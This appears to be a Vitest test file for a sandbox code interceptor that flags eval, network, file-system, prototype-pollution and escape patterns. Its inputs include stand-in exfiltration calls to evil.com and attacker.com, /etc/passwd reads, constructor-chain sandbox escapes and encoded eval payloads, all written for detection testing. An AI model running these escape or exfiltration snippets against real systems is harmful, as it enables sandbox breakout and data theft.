/**
 * @fileoverview Comprehensive tests for API interception system (intercept.ts)
 * 
 * Tests API call interception mechanisms, blocked API detection, whitelisting,
 * interception logging, security violation reporting, and escape attempt detection.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  DynamicCodeInterceptor,
  type CodeAnalysis,
  type DynamicCodeInfo,
  type EscapeAttempt,
} from '../../src/sandbox/intercept.js';

describe('API Interception System (intercept.ts)', () => {
  let interceptor: DynamicCodeInterceptor;

  beforeEach(() => {
    interceptor = new DynamicCodeInterceptor({
      enableLogging: true,
      blockEval: true,
      blockFunction: true,
      blockImport: true,
      trackCodeGeneration: true,
    });
  });

  afterEach(() => {
    if (interceptor) {
      interceptor.cleanup();
    }
  });

  describe('Dynamic Code Interception', () => {
    it('should intercept and block eval calls', () => {
      const code = 'eval("console.log(\'injected code\')")';
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsEval).toBe(true);
      expect(analysis.riskLevel).toBe('high');
      expect(analysis.securityConcerns).toContain('eval_usage');
      expect(analysis.blockedAPIs.includes('eval')).toBe(true);
    });

    it('should intercept Function constructor calls', () => {
      const code = 'new Function("return process.env")()';
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsFunction).toBe(true);
      expect(analysis.riskLevel).toBe('high');
      expect(analysis.securityConcerns).toContain('function_constructor');
      expect(analysis.blockedAPIs.includes('Function')).toBe(true);
    });

    it('should detect indirect eval patterns', () => {
      const code = `
        const evalFunc = eval;
        evalFunc('malicious code');
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsEval).toBe(true);
      expect(analysis.indirectPatterns.length).toBeGreaterThan(0);
      expect(analysis.riskLevel).toBe('high');
    });

    it('should detect string-based timer functions', () => {
      const code = `
        setTimeout("console.log('delayed injection')", 100);
        setInterval("alert('recurring')", 1000);
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsTimerString).toBe(true);
      expect(analysis.securityConcerns).toContain('string_timer');
      expect(analysis.blockedAPIs.includes('setTimeout')).toBe(true);
      expect(analysis.blockedAPIs.includes('setInterval')).toBe(true);
    });

    it('should allow function-based timer calls', () => {
      const code = `
        setTimeout(function() { console.log('safe'); }, 100);
        setInterval(() => { console.log('also safe'); }, 1000);
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsTimerString).toBe(false);
      expect(analysis.riskLevel).toBe('low');
      expect(analysis.allowedAPIs.includes('setTimeout')).toBe(true);
      expect(analysis.allowedAPIs.includes('setInterval')).toBe(true);
    });
  });

  describe('Network API Interception', () => {
    it('should block XMLHttpRequest access', () => {
      const code = `
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://evil.com/steal');
        xhr.send();
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsNetworkAPI).toBe(true);
      expect(analysis.blockedAPIs.includes('XMLHttpRequest')).toBe(true);
      expect(analysis.securityConcerns).toContain('network_access');
      expect(analysis.riskLevel).toBe('critical');
    });

    it('should block fetch API calls', () => {
      const code = `
        fetch('https://attacker.com/exfiltrate', {
          method: 'POST',
          body: JSON.stringify({ data: 'stolen' })
        });
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsNetworkAPI).toBe(true);
      expect(analysis.blockedAPIs.includes('fetch')).toBe(true);
      expect(analysis.networkPatterns.length).toBeGreaterThan(0);
    });

    it('should block WebSocket connections', () => {
      const code = `
        const ws = new WebSocket('wss://evil.com/backdoor');
        ws.onopen = () => ws.send('compromised');
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsNetworkAPI).toBe(true);
      expect(analysis.blockedAPIs.includes('WebSocket')).toBe(true);
      expect(analysis.securityConcerns).toContain('websocket_access');
    });

    it('should block EventSource connections', () => {
      const code = `
        const source = new EventSource('https://evil.com/stream');
        source.onmessage = (event) => console.log(event.data);
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsNetworkAPI).toBe(true);
      expect(analysis.blockedAPIs.includes('EventSource')).toBe(true);
    });
  });

  describe('File System Access Interception', () => {
    it('should block require() calls', () => {
      const code = `
        const fs = require('fs');
        const data = fs.readFileSync('/etc/passwd', 'utf8');
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsRequire).toBe(true);
      expect(analysis.blockedAPIs.includes('require')).toBe(true);
      expect(analysis.securityConcerns).toContain('require_access');
      expect(analysis.riskLevel).toBe('critical');
    });

    it('should block dynamic import calls', () => {
      const code = `
        import('fs').then(fs => {
          return fs.readFileSync('/sensitive/file');
        });
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsDynamicImport).toBe(true);
      expect(analysis.blockedAPIs.includes('import')).toBe(true);
      expect(analysis.securityConcerns).toContain('dynamic_import');
    });

    it('should detect Node.js global access attempts', () => {
      const code = `
        const env = process.env;
        const cwd = process.cwd();
        const exit = process.exit;
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsNodeGlobals).toBe(true);
      expect(analysis.blockedAPIs.includes('process')).toBe(true);
      expect(analysis.securityConcerns).toContain('node_global_access');
    });

    it('should block __dirname and __filename access', () => {
      const code = `
        const dir = __dirname;
        const file = __filename;
        console.log(dir + '/' + file);
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsNodeGlobals).toBe(true);
      expect(analysis.blockedAPIs.includes('__dirname')).toBe(true);
      expect(analysis.blockedAPIs.includes('__filename')).toBe(true);
    });
  });

  describe('Prototype Pollution Detection', () => {
    it('should detect Object.prototype modification attempts', () => {
      const code = `
        Object.prototype.polluted = 'malicious';
        Object.prototype['__proto__'] = null;
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsPrototypePollution).toBe(true);
      expect(analysis.securityConcerns).toContain('prototype_pollution');
      expect(analysis.riskLevel).toBe('high');
    });

    it('should detect Array.prototype modification attempts', () => {
      const code = `
        Array.prototype.polluted = true;
        Array.prototype.push = function() { /* malicious */ };
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsPrototypePollution).toBe(true);
      expect(analysis.prototypePollutionTargets.includes('Array')).toBe(true);
    });

    it('should detect Function.prototype manipulation', () => {
      const code = `
        Function.prototype.call = function() { return 'hijacked'; };
        Function.prototype.apply = null;
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsPrototypePollution).toBe(true);
      expect(analysis.prototypePollutionTargets.includes('Function')).toBe(true);
    });
  });

  describe('Constructor Chain Exploitation Detection', () => {
    it('should detect constructor chain traversal', () => {
      const code = `
        const constructor = ({}).constructor.constructor;
        constructor('return process')();
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsConstructorChain).toBe(true);
      expect(analysis.securityConcerns).toContain('constructor_chain');
      expect(analysis.riskLevel).toBe('critical');
    });

    it('should detect Array constructor exploitation', () => {
      const code = `
        [].constructor.constructor('return this')().global;
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsConstructorChain).toBe(true);
      expect(analysis.constructorChainTargets.includes('Array')).toBe(true);
    });

    it('should detect String constructor exploitation', () => {
      const code = `
        ''.constructor.constructor('return process.env')();
      `;
      
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.containsConstructorChain).toBe(true);
      expect(analysis.constructorChainTargets.includes('String')).toBe(true);
    });
  });

  describe('Escape Attempt Detection', () => {
    it('should detect VM escape attempts', () => {
      const escapeCode = `
        try {
          const vm = require('vm');
          const code = 'this.constructor.constructor("return process")()';
          vm.runInNewContext(code, {});
        } catch(e) {}
      `;
      
      const escapeAttempt = interceptor.detectEscapeAttempt(escapeCode);
      
      expect(escapeAttempt.detected).toBe(true);
      expect(escapeAttempt.severity).toBe('critical');
      expect(escapeAttempt.techniques.includes('vm_escape')).toBe(true);
      expect(escapeAttempt.riskFactors.includes('sandbox_breakout')).toBe(true);
    });

    it('should detect this context manipulation', () => {
      const escapeCode = `
        (function() {
          return this.constructor.constructor('return this')();
        }).call(null);
      `;
      
      const escapeAttempt = interceptor.detectEscapeAttempt(escapeCode);
      
      expect(escapeAttempt.detected).toBe(true);
      expect(escapeAttempt.techniques.includes('this_manipulation')).toBe(true);
    });

    it('should detect with statement abuse', () => {
      const escapeCode = `
        with (console) {
          with (constructor) {
            constructor('return process')();
          }
        }
      `;
      
      const escapeAttempt = interceptor.detectEscapeAttempt(escapeCode);
      
      expect(escapeAttempt.detected).toBe(true);
      expect(escapeAttempt.techniques.includes('with_statement')).toBe(true);
    });
  });

  describe('Logging and Monitoring', () => {
    it('should log blocked API attempts', () => {
      const consoleSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      
      const code = 'eval("malicious code")';
      interceptor.analyzeCode(code);
      
      expect(consoleSpy).toHaveBeenCalledWith(
        expect.stringMatching(/blocked.*eval/i)
      );
      
      consoleSpy.mockRestore();
    });

    it('should track API usage statistics', () => {
      const codes = [
        'eval("test1")',
        'new Function("test2")',
        'fetch("https://example.com")',
        'require("fs")',
      ];
      
      codes.forEach(code => interceptor.analyzeCode(code));
      
      const stats = interceptor.getStatistics();
      expect(stats.totalAnalyses).toBe(4);
      expect(stats.blockedAttempts).toBe(4);
      expect(stats.topBlockedAPIs.includes('eval')).toBe(true);
      expect(stats.topBlockedAPIs.includes('Function')).toBe(true);
      expect(stats.topBlockedAPIs.includes('fetch')).toBe(true);
      expect(stats.topBlockedAPIs.includes('require')).toBe(true);
    });

    it('should generate detailed violation reports', () => {
      const maliciousCode = `
        eval("injected");
        fetch("https://evil.com");
        Object.prototype.polluted = true;
      `;
      
      const analysis = interceptor.analyzeCode(maliciousCode);
      const report = interceptor.generateViolationReport(analysis);
      
      expect(report).toBeDefined();
      expect(report.timestamp).toBeDefined();
      expect(report.codeHash).toBeDefined();
      expect(report.violations.length).toBeGreaterThan(0);
      expect(report.riskScore).toBeGreaterThan(70);
      expect(report.blockedAPIs.length).toBeGreaterThan(0);
    });
  });

  describe('Configuration and Customization', () => {
    it('should allow custom API whitelisting', () => {
      const customInterceptor = new DynamicCodeInterceptor({
        enableLogging: false,
        blockEval: false,
        blockFunction: true,
        allowedAPIs: ['eval'],
        blockedAPIs: ['XMLHttpRequest'],
      });
      
      const evalCode = 'eval("test")';
      const xhrCode = 'new XMLHttpRequest()';
      
      const evalAnalysis = customInterceptor.analyzeCode(evalCode);
      const xhrAnalysis = customInterceptor.analyzeCode(xhrCode);
      
      expect(evalAnalysis.allowedAPIs.includes('eval')).toBe(true);
      expect(evalAnalysis.riskLevel).toBe('medium'); // Allowed but still risky
      
      expect(xhrAnalysis.blockedAPIs.includes('XMLHttpRequest')).toBe(true);
      expect(xhrAnalysis.riskLevel).toBe('critical');
    });

    it('should support custom risk assessment', () => {
      interceptor.setRiskAssessmentCallback((analysis: CodeAnalysis) => {
        if (analysis.containsEval && analysis.containsNetworkAPI) {
          return 'critical';
        }
        if (analysis.containsConstructorChain) {
          return 'high';
        }
        return 'low';
      });
      
      const highRiskCode = `
        eval("test");
        fetch("https://example.com");
      `;
      
      const analysis = interceptor.analyzeCode(highRiskCode);
      expect(analysis.riskLevel).toBe('critical');
    });

    it('should allow pattern customization', () => {
      interceptor.addCustomPattern('dangerous_api', /bitcoin\.mining/gi);
      
      const code = 'bitcoin.mining.start()';
      const analysis = interceptor.analyzeCode(code);
      
      expect(analysis.customPatterns.includes('dangerous_api')).toBe(true);
      expect(analysis.securityConcerns).toContain('custom_pattern_dangerous_api');
    });
  });

  describe('Performance and Edge Cases', () => {
    it('should handle large code inputs efficiently', () => {
      const largeCode = 'const x = 1;\n'.repeat(10000) + 'eval("test");';
      
      const startTime = performance.now();
      const analysis = interceptor.analyzeCode(largeCode);
      const endTime = performance.now();
      
      expect(endTime - startTime).toBeLessThan(100); // Should complete quickly
      expect(analysis.containsEval).toBe(true);
    });

    it('should handle malformed code gracefully', () => {
      const malformedCode = 'eval("test"))\n\n\n{{{{ invalid syntax';
      
      expect(() => {
        const analysis = interceptor.analyzeCode(malformedCode);
        expect(analysis).toBeDefined();
      }).not.toThrow();
    });

    it('should handle empty and whitespace-only code', () => {
      const emptyCodes = ['', '   ', '\n\t\r\n', '// just comments'];
      
      emptyCodes.forEach(code => {
        const analysis = interceptor.analyzeCode(code);
        expect(analysis.riskLevel).toBe('low');
        expect(analysis.securityConcerns.length).toBe(0);
      });
    });

    it('should detect deeply nested patterns', () => {
      const nestedCode = `
        (function() {
          return (function() {
            return (function() {
              return eval("deeply nested");
            })();
          })();
        })();
      `;
      
      const analysis = interceptor.analyzeCode(nestedCode);
      expect(analysis.containsEval).toBe(true);
      expect(analysis.nestingDepth).toBeGreaterThan(2);
    });

    it('should handle regex patterns safely', () => {
      const regexCode = `
        const maliciousRegex = /(a+)+$/;
        const input = 'a'.repeat(1000) + 'b';
        maliciousRegex.test(input);
      `;
      
      const analysis = interceptor.analyzeCode(regexCode);
      expect(analysis.containsRegexDos).toBe(true);
      expect(analysis.securityConcerns).toContain('regex_dos');
    });
  });

  describe('Real-world Attack Patterns', () => {
    it('should detect base64 payload patterns', () => {
      const base64Attack = `
        const payload = 'ZXZhbCgiYWxlcnQoJ2hhY2tlZCcpIik=';
        eval(atob(payload));
      `;
      
      const analysis = interceptor.analyzeCode(base64Attack);
      expect(analysis.containsEncoding).toBe(true);
      expect(analysis.encodingTypes.includes('base64')).toBe(true);
      expect(analysis.riskLevel).toBe('critical');
    });

    it('should detect hex encoding patterns', () => {
      const hexAttack = `
        const encoded = '\\x65\\x76\\x61\\x6c';
        const decoded = encoded.replace(/\\\\x([0-9a-f]{2})/gi, 
          (match, hex) => String.fromCharCode(parseInt(hex, 16))
        );
        eval(decoded + '("alert(1)")');
      `;
      
      const analysis = interceptor.analyzeCode(hexAttack);
      expect(analysis.containsEncoding).toBe(true);
      expect(analysis.encodingTypes.includes('hex')).toBe(true);
      expect(analysis.containsEval).toBe(true);
    });

    it('should detect unicode escape patterns', () => {
      const unicodeAttack = `
        const evilCode = '\\u0065\\u0076\\u0061\\u006c';
        eval(evilCode + '("hacked")');
      `;
      
      const analysis = interceptor.analyzeCode(unicodeAttack);
      expect(analysis.containsEncoding).toBe(true);
      expect(analysis.encodingTypes.includes('unicode')).toBe(true);
    });

    it('should detect obfuscation through string manipulation', () => {
      const stringManipulation = `
        const parts = ['ev', 'al'];
        const method = parts.join('');
        window[method]('alert("obfuscated")');
      `;
      
      const analysis = interceptor.analyzeCode(stringManipulation);
      expect(analysis.containsStringManipulation).toBe(true);
      expect(analysis.obfuscationTechniques.includes('string_concat')).toBe(true);
      expect(analysis.riskLevel).toBe('high');
    });
  });
});